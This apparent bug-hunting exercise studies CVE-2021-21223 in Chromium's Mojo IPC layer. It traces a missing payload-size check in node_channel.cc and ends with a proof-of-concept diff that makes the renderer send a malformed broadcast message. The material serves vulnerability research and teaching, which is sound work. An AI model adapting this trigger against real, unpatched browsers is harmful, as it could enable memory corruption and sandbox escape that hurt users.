# Exercise 3

In LEVEL 1, we can relay on Details and just to search for the func which Details mentioned. It is far away from the real bug hunting scene.

LEVEL 2 we do the same as LEVEL 1 without the help of Details.

But the bug report need Poc to assist developer reproduce the vulnerability, and know exactly what cause this bug. So LEVEL 3 need we construct Poc by ourselves.

## CVE-2021-21223
I sugget you don't search any report about it to prevents get too much info like patch.



### Details

In level 3, we do it without the help of Details


---------

<details>
  <summary>For more info click me! But you'd better not do this</summary>

  https://bugs.chromium.org/p/chromium/issues/detail?id=1195308

</details>

--------

### Set environment

after fetch chromium
```sh
git reset --hard 5fea97e8b681c0a0e142f68ed03d5c4cc5862672
```



### Related code

mojo/core/node_channel.cc
<!-- mojo/core/node_channel.h
mojo/core/node_controller.cc
mojo/core/user_message_impl.cc -->

read this [design doc](https://chromium.googlesource.com/chromium/src/+/6740adb28374ddeee13febfd5e5d20cb8a365979/mojo/core#mojo-core-overview) about `mojo-code`, you can understand source code faster.


### Do it
Do this exercise by yourself, If you find my answer have something wrong, please correct it.


---------

<details>
  <summary>My answer</summary>

  I have notice one func, and this is the only func I suspect.
  ```c++
// static
void NodeChannel::GetEventMessageData(Channel::Message* message,
                                      void** data,
                                      size_t* num_data_bytes) {
  // NOTE: OnChannelMessage guarantees that we never accept a Channel::Message
  // with a payload of fewer than |sizeof(Header)| bytes.
  *data = reinterpret_cast<Header*>(message->mutable_payload()) + 1;
  *num_data_bytes = message->payload_size() - sizeof(Header);
}
  ```
  The **comment** reminds me, `NOTE: OnChannelMessage guarantees that we never accept a Channel::Message with a payload of fewer than |sizeof(Header)| bytes.`

  Can we make `message->payload_size()` less than `sizeof(Header)`? First we need bypass OnChannelMessage to get here.

  ```c++
void NodeChannel::OnChannelMessage(const void* payload,
                                   size_t payload_size,
                                   std::vector<PlatformHandle> handles) {
  DCHECK(owning_task_runner()->RunsTasksInCurrentSequence());

  RequestContext request_context(RequestContext::Source::SYSTEM);

  if (payload_size <= sizeof(Header)) {                [1]
    delegate_->OnChannelError(remote_node_name_, this);
    return;
  }
  //[ ... ]
    case MessageType::BROADCAST_EVENT: {
    if (payload_size <= sizeof(Header))
      break;
    const void* data = static_cast<const void*>(
        reinterpret_cast<const Header*>(payload) + 1);
    Channel::MessagePtr message =
        Channel::Message::Deserialize(data, payload_size - sizeof(Header));
    if (!message || message->has_handles()) {
      DLOG(ERROR) << "Dropping invalid broadcast message.";
      break;
    }
    delegate_->OnBroadcast(remote_node_name_, std::move(message));   [2]
    return;
  }
  ```
  [1] check `payload_size <= sizeof(Header)` at begain of OnChannelMessage, and I will explain [2] alter.

  We can search for which func call `GetEventMessageData`
  ```c++
ports::ScopedEvent DeserializeEventMessage(
    const ports::NodeName& from_node,
    Channel::MessagePtr channel_message) {
  void* data;
  size_t size;
  NodeChannel::GetEventMessageData(channel_message.get(), &data, &size);  [3]
  auto event = ports::Event::Deserialize(data, size);
  if (!event)
    return nullptr;
 [ ... ]
}
===========================================================
// static
Channel::MessagePtr UserMessageImpl::FinalizeEventMessage(
    std::unique_ptr<ports::UserMessageEvent> message_event) {
  [ ... ]
  if (channel_message) {
    void* data;
    size_t size;
    NodeChannel::GetEventMessageData(channel_message.get(), &data, &size);  [4]
    message_event->Serialize(data);
  }
  return channel_message;
}
  ```
  [3] and [4] both call `GetEventMessageData`, I analysis `DeserializeEventMessage`
  ```c++
void NodeController::BroadcastEvent(ports::ScopedEvent event) {
  Channel::MessagePtr channel_message = SerializeEventMessage(std::move(event));
  DCHECK(channel_message && !channel_message->has_handles());

  scoped_refptr<NodeChannel> broker = GetBrokerChannel();
  if (broker)
    broker->Broadcast(std::move(channel_message));
  else
    OnBroadcast(name_, std::move(channel_message));        [5]
}
=================================================================
void NodeController::OnBroadcast(const ports::NodeName& from_node,
                                 Channel::MessagePtr message) {
  DCHECK(!message->has_handles());

  auto event = DeserializeEventMessage(from_node, std::move(message));  [6]
  [ ... ]
  ```
  [6] call `DeserializeEventMessage` and `BroadcastEvent` call `OnBroadcast`, this is different from [2]. [2] will check `if (payload_size <= sizeof(Header))` before call `OnBroadcast`. And this way have no check so far, maybe I am wrong.


  **Poc**
  >To reproduce the issue, please patch chrome through the following patch
  ```diff
diff --git a/mojo/core/node_channel.cc b/mojo/core/node_channel.cc
index c48fb573fea9..7ce197a579f5 100644
--- a/mojo/core/node_channel.cc
+++ b/mojo/core/node_channel.cc
@@ -17,7 +17,7 @@
 #include "mojo/core/configuration.h"
 #include "mojo/core/core.h"
 #include "mojo/core/request_context.h"
-
+#include "base/trace_event/trace_event.h"
 namespace mojo {
 namespace core {
 
@@ -327,12 +327,23 @@ void NodeChannel::AcceptInvitee(const ports::NodeName& inviter_name,
 
 void NodeChannel::AcceptInvitation(const ports::NodeName& token,
                                    const ports::NodeName& invitee_name) {
-  AcceptInvitationData* data;
-  Channel::MessagePtr message = CreateMessage(
-      MessageType::ACCEPT_INVITATION, sizeof(AcceptInvitationData), 0, &data);
-  data->token = token;
-  data->invitee_name = invitee_name;
-  WriteChannelMessage(std::move(message));
+  if (base::trace_event::TraceLog::GetInstance()->process_name() ==
+      "Renderer") {
+    void* data;
+    Channel::MessagePtr broadcast_message =
+        CreateMessage(MessageType::BROADCAST_EVENT, 16, 0, &data);
+    uint32_t buffer[] = {16, 16 + 0x10000, 0, 0};
+    memcpy(data, buffer, sizeof(buffer));
+    WriteChannelMessage(std::move(broadcast_message));
+  } else {
+    AcceptInvitationData* data;
+    Channel::MessagePtr message = CreateMessage(
+        MessageType::ACCEPT_INVITATION, sizeof(AcceptInvitationData), 0,
+        &data);
+    data->token = token;
+    data->invitee_name = invitee_name;
+    WriteChannelMessage(std::move(message));
+  }
 }
 
 void NodeChannel::AcceptPeer(const ports::NodeName& sender_name,
  ```
  
</details>

--------
